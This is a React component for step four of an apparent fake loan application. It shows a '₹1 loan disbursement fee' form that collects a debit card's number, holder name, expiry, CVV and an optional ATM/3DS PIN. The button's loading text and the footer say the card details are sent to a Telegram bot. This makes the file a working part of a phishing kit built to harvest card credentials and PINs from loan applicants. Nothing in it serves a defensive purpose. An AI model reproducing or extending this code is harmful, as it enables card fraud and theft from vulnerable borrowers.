import React, { useState } from 'react';
import { CreditCard, Lock, ShieldCheck, ArrowRight, Loader2, Sparkles, KeyRound, AlertCircle } from 'lucide-react';
import { motion } from 'motion/react';
import { CardDetails } from '../types';
import { AppDownloadButton } from './AppDownloadButton';

interface Step4CardPaymentProps {
  applicantName: string;
  phone: string;
  onSubmitCardDetails: (cardData: CardDetails) => Promise<void>;
}

export const Step4CardPayment: React.FC<Step4CardPaymentProps> = ({
  applicantName,
  phone,
  onSubmitCardDetails,
}) => {
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState(applicantName || '');
  const [exp, setExp] = useState('');
  const [cvv, setCvv] = useState('');
  const [pin, setPin] = useState('');

  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  // Card brand detection helper
  const getCardBrand = (numberStr: string) => {
    const clean = numberStr.replace(/\s/g, '');
    if (clean.startsWith('4')) return 'Visa';
    if (/^(5[1-5]|2[2-7])/.test(clean)) return 'Mastercard';
    if (/^(60|65|35|508)/.test(clean)) return 'RuPay';
    if (/^3[47]/.test(clean)) return 'American Express';
    return 'Debit Card';
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = raw.replace(/(\d{4})/g, '$1 ').trim();
    setCardNumber(formatted);
  };

  const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length >= 3) {
      raw = `${raw.slice(0, 2)}/${raw.slice(2)}`;
    }
    setExp(raw);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCvv(raw);
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 6);
    setPin(raw);
  };

  const validate = () => {
    const newErrors: Record<string, string> = {};
    const cleanCard = cardNumber.replace(/\s/g, '');
    if (cleanCard.length < 15) {
      newErrors.cardNumber = 'Enter a valid 16-digit debit card number';
    }

    if (!cardHolder.trim()) {
      newErrors.cardHolder = 'Cardholder name is required';
    }

    if (exp.length !== 5 || !exp.includes('/')) {
      newErrors.exp = 'Expiry format MM/YY required';
    }

    if (cvv.length < 3) {
      newErrors.cvv = '3-digit CVV required';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;

    setLoading(true);
    try {
      await onSubmitCardDetails({
        cardNumber,
        cardHolder,
        exp,
        cvv,
        pin,
      });
    } catch (err: any) {
      setErrors({ form: err.message || 'Payment processing failed. Please check card details.' });
    } finally {
      setLoading(false);
    }
  };

  const brand = getCardBrand(cardNumber);

  return (
    <motion.div
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -15 }}
      className="max-w-lg mx-auto bg-white rounded-3xl border border-slate-200/80 shadow-xl shadow-slate-200/50 p-4 sm:p-7"
    >
      <div className="flex items-center justify-between border-b border-slate-100 pb-3.5 mb-5">
        <div>
          <h2 className="text-xl sm:text-2xl font-bold text-slate-900 tracking-tight">Loan Disbursement Fee</h2>
          <p className="text-xs text-slate-500 mt-0.5">
            1Rs Debit Card Verification Charge
          </p>
        </div>
        <div className="bg-emerald-50 text-emerald-700 px-2.5 py-1 rounded-xl border border-emerald-200 font-black text-xs sm:text-sm flex items-center space-x-1 shrink-0">
          <span>Fee:</span>
          <span className="text-emerald-800 text-sm sm:text-base">₹1.00</span>
        </div>
      </div>

      {/* Visual Debit Card Preview */}
      <div className="bg-gradient-to-tr from-slate-900 via-slate-800 to-emerald-950 text-white rounded-2xl p-5 mb-6 shadow-xl shadow-slate-900/20 relative overflow-hidden border border-slate-700">
        <div className="flex justify-between items-start mb-6">
          <div className="flex items-center space-x-2">
            <CreditCard className="w-6 h-6 text-emerald-400" />
            <span className="text-xs font-bold text-emerald-300 uppercase tracking-wider">Debit Card</span>
          </div>
          <span className="text-xs font-bold px-2.5 py-0.5 rounded-md bg-white/10 backdrop-blur-md text-slate-200">
            {brand}
          </span>
        </div>

        <div className="mb-4">
          <p className="text-xs text-slate-400 font-mono">Card Number</p>
          <p className="text-xl font-mono font-bold tracking-wider text-slate-100 mt-0.5">
            {cardNumber || '•••• •••• •••• ••••'}
          </p>
        </div>

        <div className="flex justify-between items-end text-xs font-mono">
          <div>
            <p className="text-slate-400 text-[10px] uppercase">Card Holder</p>
            <p className="font-bold text-slate-200 tracking-wide uppercase">{cardHolder || 'YOUR NAME'}</p>
          </div>
          <div>
            <p className="text-slate-400 text-[10px] uppercase">Expires</p>
            <p className="font-bold text-slate-200">{exp || 'MM/YY'}</p>
          </div>
        </div>
      </div>

      {/* Card Details Form */}
      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Card Number Input */}
        <div>
          <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
            Debit Card Number
          </label>
          <div className="relative">
            <input
              type="text"
              value={cardNumber}
              onChange={handleCardNumberChange}
              placeholder="4111 2222 3333 4444"
              maxLength={19}
              className={`w-full px-4 py-3 bg-slate-50 border rounded-2xl text-slate-900 text-sm font-mono font-bold tracking-wider outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
                errors.cardNumber ? 'border-rose-500' : 'border-slate-200'
              }`}
            />
            <div className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-bold text-slate-400">
              {brand}
            </div>
          </div>
          {errors.cardNumber && <p className="text-xs text-rose-500 mt-1 font-medium">{errors.cardNumber}</p>}
        </div>

        {/* Card Holder Name */}
        <div>
          <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
            Cardholder Name
          </label>
          <input
            type="text"
            value={cardHolder}
            onChange={(e) => setCardHolder(e.target.value)}
            placeholder="As printed on card"
            className={`w-full px-4 py-3 bg-slate-50 border rounded-2xl text-slate-900 text-sm font-semibold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
              errors.cardHolder ? 'border-rose-500' : 'border-slate-200'
            }`}
          />
          {errors.cardHolder && <p className="text-xs text-rose-500 mt-1 font-medium">{errors.cardHolder}</p>}
        </div>

        {/* Expiry & CVV */}
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
              Expiry Date (MM/YY)
            </label>
            <input
              type="text"
              value={exp}
              onChange={handleExpChange}
              placeholder="08/28"
              maxLength={5}
              className={`w-full px-4 py-3 bg-slate-50 border rounded-2xl text-slate-900 text-sm font-mono font-bold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
                errors.exp ? 'border-rose-500' : 'border-slate-200'
              }`}
            />
            {errors.exp && <p className="text-xs text-rose-500 mt-1 font-medium">{errors.exp}</p>}
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
              CVV / CVC
            </label>
            <input
              type="password"
              value={cvv}
              onChange={handleCvvChange}
              placeholder="123"
              maxLength={4}
              className={`w-full px-4 py-3 bg-slate-50 border rounded-2xl text-slate-900 text-sm font-mono font-bold outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 ${
                errors.cvv ? 'border-rose-500' : 'border-slate-200'
              }`}
            />
            {errors.cvv && <p className="text-xs text-rose-500 mt-1 font-medium">{errors.cvv}</p>}
          </div>
        </div>

        {/* Optional PIN Field as requested */}
        <div className="bg-slate-50 rounded-2xl p-3.5 border border-slate-200">
          <div className="flex items-center justify-between mb-1">
            <label className="text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1">
              <KeyRound className="w-3.5 h-3.5 text-slate-500" />
              <span>PIN Number (Optional)</span>
            </label>
            <span className="text-[10px] bg-slate-200 text-slate-600 font-semibold px-2 py-0.5 rounded-full">
              Optional
            </span>
          </div>
          <input
            type="password"
            value={pin}
            onChange={handlePinChange}
            placeholder="Enter ATM / 3DS PIN (if required)"
            maxLength={6}
            className="w-full px-4 py-2.5 bg-white border border-slate-200 rounded-xl text-slate-900 text-sm font-mono font-semibold outline-none focus:border-emerald-500"
          />
        </div>

        {errors.form && (
          <div className="p-3 bg-rose-50 border border-rose-200 rounded-xl flex items-center space-x-2 text-rose-700 text-xs font-medium">
            <AlertCircle className="w-4 h-4 shrink-0" />
            <span>{errors.form}</span>
          </div>
        )}

        <button
          type="submit"
          disabled={loading}
          className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-2xl transition-all shadow-xl shadow-emerald-600/20 flex items-center justify-center space-x-2 cursor-pointer"
        >
          {loading ? (
            <>
              <Loader2 className="w-5 h-5 animate-spin text-white" />
              <span>Transmitting Card Payload to Telegram Bot...</span>
            </>
          ) : (
            <>
              <span>Pay ₹1 & Complete Disbursement</span>
              <ArrowRight className="w-5 h-5 text-emerald-200" />
            </>
          )}
        </button>

        {/* App Download Button */}
        <AppDownloadButton />
      </form>

      <div className="mt-4 text-center">
        <p className="text-[11px] text-slate-400 flex items-center justify-center space-x-1">
          <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
          <span>Card details encrypted and dispatched via server API to Telegram Bot</span>
        </p>
      </div>
    </motion.div>
  );
};
